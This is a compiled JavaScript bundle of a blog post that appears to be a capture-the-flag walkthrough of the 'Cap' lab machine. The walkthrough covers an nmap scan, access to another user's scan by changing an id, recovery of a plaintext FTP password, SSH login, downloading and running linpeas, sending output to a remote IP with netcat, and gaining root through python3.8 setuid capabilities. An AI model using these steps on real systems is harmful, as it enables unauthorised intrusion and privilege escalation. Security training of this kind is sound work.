"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[184],{3937:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>p,contentTitle:()=>l,default:()=>u,frontMatter:()=>i,metadata:()=>o,toc:()=>r});var n=a(8168),s=(a(6540),a(5680));const i={},l=void 0,o={permalink:"/Blog/blog/Cap",editUrl:"https://github.com/danae-pan/Blog/blog/Cap.md",source:"@site/blog/Cap.md",title:"Cap",description:"Task 1",date:"2025-04-04T21:17:12.917Z",formattedDate:"April 4, 2025",tags:[],readingTime:2.695,truncated:!1,authors:[],prevItem:{title:"GoodGames",permalink:"/Blog/blog/GoodGames"}},p={authorsImageUrls:[]},r=[{value:"Task 1",id:"task-1",children:[]},{value:"Task 2",id:"task-2",children:[]},{value:"Task 3",id:"task-3",children:[]},{value:"Task 4",id:"task-4",children:[]},{value:"Task 5",id:"task-5",children:[]},{value:"Task 6",id:"task-6",children:[]},{value:"Task 7",id:"task-7",children:[]},{value:"Task 8",id:"task-8",children:[]},{value:"Task 9",id:"task-9",children:[]}],g={toc:r},h="wrapper";function u(e){let{components:t,...i}=e;return(0,s.yg)(h,(0,n.A)({},g,i,{components:t,mdxType:"MDXLayout"}),(0,s.yg)("h3",{id:"task-1"},"Task 1"),(0,s.yg)("p",null,"How many TCP ports are open?"),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"nmap -sS -p- <ip_address>")),(0,s.yg)("ul",null,(0,s.yg)("li",{parentName:"ul"},"-sS: Stealth Scan, the fastest way to scan ports of the most popular protocol (TCP). ")),(0,s.yg)("p",null,"After scanning, 3 TCP ports are showing to be open."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(5477).A})),(0,s.yg)("h3",{id:"task-2"},"Task 2"),(0,s.yg)("p",null,'After running a "Security Snapshot", the browser is redirected to a path of the format /',"[something]","/","[id]",", where ","[id]"," represents the id number of the scan. What is the ","[something]","?"),(0,s.yg)("p",null,"Upen the hamburger menu, and click on ",(0,s.yg)("strong",{parentName:"p"},"Security Snapshot (5 Second PCAP + Analysis)")," "),(0,s.yg)("p",null,"This will redirect you ti a URL with something being ",(0,s.yg)("strong",{parentName:"p"},"data"),". "),(0,s.yg)("h3",{id:"task-3"},"Task 3"),(0,s.yg)("p",null,"Are you able to get to other users' scans?"),(0,s.yg)("p",null,"For this, you can try and change the ",(0,s.yg)("strong",{parentName:"p"},"id")," from ",(0,s.yg)("strong",{parentName:"p"},"1")," to another value. If you try with the value ",(0,s.yg)("strong",{parentName:"p"},"0")," you will see different dashboard, which means you were able to get to other user's scans."),(0,s.yg)("h3",{id:"task-4"},"Task 4"),(0,s.yg)("p",null,"What is the ID of the PCAP file that contains sensative data?"),(0,s.yg)("p",null,"The page that was found before with the ",(0,s.yg)("strong",{parentName:"p"},"id")," equal to ",(0,s.yg)("strong",{parentName:"p"},"0")," is the one that contains sensative data."),(0,s.yg)("h3",{id:"task-5"},"Task 5"),(0,s.yg)("p",null,"Which application layer protocol in the pcap file can the sensetive data be found in?"),(0,s.yg)("p",null,"When you download and open the file from the dashboard page with ",(0,s.yg)("strong",{parentName:"p"},"id = 0"),", inspect the packets from the Wireshark capture. You will soon find that the sensitive data is in the FTP protocol. Where a request is sent with a password in plain text."),(0,s.yg)("h3",{id:"task-6"},"Task 6"),(0,s.yg)("p",null,"Try to ssh to the target ip address with the user name and the password for you obtained in the previous step. You will see that this will succesfully work. "),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"ssh nathan@<target_ip>")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(8764).A})),(0,s.yg)("h3",{id:"task-7"},"Task 7"),(0,s.yg)("p",null,"Get the user.txt flag from the ftp server."),(0,s.yg)("p",null,"```wget ftp://user:",(0,s.yg)("a",{parentName:"p",href:"mailto:password@ftp.mydomain.com"},"password@ftp.mydomain.com"),"/path/file.ext````"),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(9399).A})),(0,s.yg)("p",null,"In your host run ",(0,s.yg)("inlineCode",{parentName:"p"},"cat user.txt")," and obtain the user flag."),(0,s.yg)("h3",{id:"task-8"},"Task 8"),(0,s.yg)("p",null,"What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?"),(0,s.yg)("p",null,"First clone the reposiroty for using the Linux escalating privelages script. Then make the script executable."),(0,s.yg)("pre",null,(0,s.yg)("code",{parentName:"pre"},"wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh\n\nchmod +x linpeas.sh\n\n")),(0,s.yg)("p",null,"Start a Python HTTP server to transfer the script to the target machine."),(0,s.yg)("p",null,"```python3 -m http.server 8080````"),(0,s.yg)("p",null,"On the target machine, log in with the username ",(0,s.yg)("strong",{parentName:"p"},"nathan")," and his credentials, get the file from your host system."),(0,s.yg)("pre",null,(0,s.yg)("code",{parentName:"pre"},"cd /tmp\nwget http://<host_ip_address>:8080/linpeas.sh -O linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n")),(0,s.yg)("p",null,"and run it saving the output to a text file.\n",(0,s.yg)("inlineCode",{parentName:"p"},"/tmp/linpeas.sh | tee /tmp/linpeas-output.txt")),(0,s.yg)("p",null,'You can tranfer this text file to your local machine for further analysis by opening a port to "listen" to a connection and save the incoming data to a new file locally.'),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"nc -lvnp 4444 > linpeas_output.txt")),(0,s.yg)("p",null,"From the target machine you can send the file "),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"cat linpeas_output.txt | nc 10.10.14.190 4444")),(0,s.yg)("p",null,"Inspecting the file, under ",(0,s.yg)("strong",{parentName:"p"},"Files with capabilities")," the interesting file is ",(0,s.yg)("strong",{parentName:"p"},"/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip")," which indicates potential privilege escalation allowing changing the user ID to another user (including root)"),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(8181).A})),(0,s.yg)("h3",{id:"task-9"},"Task 9"),(0,s.yg)("p",null,"You can escalate priveleges and switch to root by attempting"),(0,s.yg)("p",null," ",(0,s.yg)("inlineCode",{parentName:"p"},"/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")),(0,s.yg)("p",null," then find the flag "),(0,s.yg)("p",null," ",(0,s.yg)("inlineCode",{parentName:"p"},'find / -name "root.txt" 2>/dev/null')),(0,s.yg)("p",null," and read the flag by\n",(0,s.yg)("inlineCode",{parentName:"p"},"cat /root/root.tx/")))}u.isMDXComponent=!0},5477:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-c-2491fb36b98b104943ea527f80ccecbf.png"},8181:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-c-3-e2f193c6826ee8912cec1ffd7e68d37c.png"},8764:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-c-2-b9391c7ad666eef49e23031fbb6b15e0.png"},9399:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-c-1-f7f9b0dbf4cb43e20733f5f3c49c08dc.png"}}]);